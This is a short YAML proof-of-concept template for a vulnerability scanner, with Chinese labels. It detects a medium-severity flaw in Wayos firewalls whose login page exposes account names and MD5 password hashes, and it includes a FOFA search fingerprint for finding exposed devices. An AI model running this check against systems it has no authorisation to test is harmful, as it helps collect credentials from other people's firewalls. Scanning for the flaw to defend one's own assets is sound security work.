id: poc-yaml-wayos-firewall-account-password-leak
info:
  name: Wayos 防火墙 账号密码泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: wayos防火墙
  fofa: body="Get_Verify_Info(hex_md5(user_string)."
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"\"name\"") && contains(body,"var
    persons =") && matches(body,`"password":"[0-9a-f]{32}"`)
variables: {}
transport: http
